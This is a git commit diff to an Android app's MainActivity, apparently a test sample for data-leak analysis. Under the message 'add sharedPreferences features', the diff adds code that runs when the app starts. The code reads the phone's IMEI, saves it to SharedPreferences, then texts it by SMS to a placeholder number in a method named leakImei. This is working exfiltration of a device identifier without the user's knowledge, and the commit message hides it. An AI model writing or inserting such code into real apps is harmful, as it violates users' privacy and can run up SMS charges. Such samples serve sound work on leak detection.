af9f42ebb94f20fe7befda092ff5cc0ac033c945
shivapbhusal <civabhusal@gmail.com>
2018-02-11 17:54:22 -0500

    add sharedPreferences features

--- SharedPreference/app/src/main/java/com/example/shiva/sharedpreference/MainActivity.java
+++ SharedPreference/app/src/main/java/com/example/shiva/sharedpreference/MainActivity.java
@@ -1,9 +1,15 @@
 package com.example.shiva.sharedpreference;
 
+import android.app.Activity;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.widget.Toast;
+
+import static android.app.PendingIntent.getActivity;
 
 public class MainActivity extends AppCompatActivity {
     public static final String PREFS_NAME="MyPrefsFile";
@@ -14,9 +20,38 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        storeImei(getImei());
+        leakImei(retriveImei());
+
+    }
+    public String getImei()
+    {
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        String imei = telephonyManager.getDeviceId(); // Source
+        return imei;
+    }
+
+    public void storeImei(String imei)
+    {
         sharedPref=getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
         SharedPreferences.Editor editor=sharedPref.edit();
-        editor.putString(IMEI,"00000");
+        editor.putString(IMEI,imei);
         editor.commit();
     }
+
+    public String retriveImei() // Retrive from shared Preference
+    {
+        SharedPreferences settings=getSharedPreferences(PREFS_NAME,Context.MODE_PRIVATE);
+        String imei=settings.getString(IMEI,null);
+        return imei;
+    }
+
+    public void leakImei(String imei)
+    {
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("1234", null, imei, null, null);
+
+    }
+
+
 }
